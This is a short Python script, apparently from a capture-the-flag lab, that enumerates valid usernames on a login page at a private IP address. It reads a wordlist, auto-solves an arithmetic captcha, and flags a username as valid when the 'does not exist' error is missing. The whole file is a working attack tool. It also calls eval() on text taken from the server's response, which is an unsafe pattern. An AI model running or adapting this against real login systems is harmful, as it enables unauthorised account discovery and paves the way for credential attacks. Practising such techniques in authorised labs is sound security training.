import requests
import re

with open("usernames.txt", "r") as username_file:
    usernames = [line.strip() for line in username_file]

v0_captcha = "unknown value"

for i in usernames:
	data = {'username': i, 'password': "ella", 'captcha': v0_captcha}
	respuesta = requests.post('http://10.10.251.60/login', data)
	patron = re.compile(r"\d+\s[+\-*]\s\d+")
	expre_captcha = patron.findall(respuesta.text)
	value_captcha = eval(expre_captcha[0])
	msg_error = re.findall("The user &#39;"+i+"&#39; does not exist",respuesta.text)
	if msg_error  == [] and v0_captcha != "unknown value":
		print("Correct Username: "+i)
		quit()
	v0_captcha = value_captcha
